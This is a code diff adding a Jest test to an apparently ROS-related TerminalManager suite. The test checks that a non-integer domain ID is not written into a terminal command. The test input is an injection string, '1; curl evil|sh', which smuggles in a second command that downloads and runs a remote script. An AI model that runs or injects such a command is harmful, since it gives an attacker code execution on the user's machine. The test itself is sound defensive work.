@@ -210,6 +210,15 @@ describe('TerminalManager Integration Tests', () => {
         expect(sent).toContain('export ROS_DOMAIN_ID=1 &&');
         terminalManager.setDomainId(undefined);
       });
+
+      it('ignores non-integer domains instead of writing them into the shell line', async () => {
+        const hostile = '1; curl evil|sh' as unknown as number;
+        terminalManager.setDomainId(hostile);
+        const terminal = await terminalManager.executeInNewTerminal('rviz2', workspace, 'RVIZ2');
+        const sent = (terminal.sendText as jest.Mock).mock.calls.map(call => call[0]).join('\n');
+        expect(sent).not.toContain('ROS_DOMAIN_ID');
+        expect(sent).toContain('rviz2');
+      });
     });
 
     it('build command execution', async () => {
